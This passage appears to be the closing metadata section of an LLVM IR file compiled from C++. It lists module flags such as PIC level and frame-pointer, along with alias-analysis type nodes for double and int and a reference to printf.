!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{i32 1, !"NumRegisterParameters", i32 0}
!6 = !{!7, !7, i64 0}
!7 = !{!"double", !8, i64 0}
!8 = !{!"omnipotent char", !9, i64 0}
!9 = !{!"Simple C++ TBAA"}
!10 = !{!11, !11, i64 0}
!11 = !{!"int", !8, i64 0}
!12 = !{i32 0, i32 0, i32 0, i32 0}
!13 = !{!"printf"}
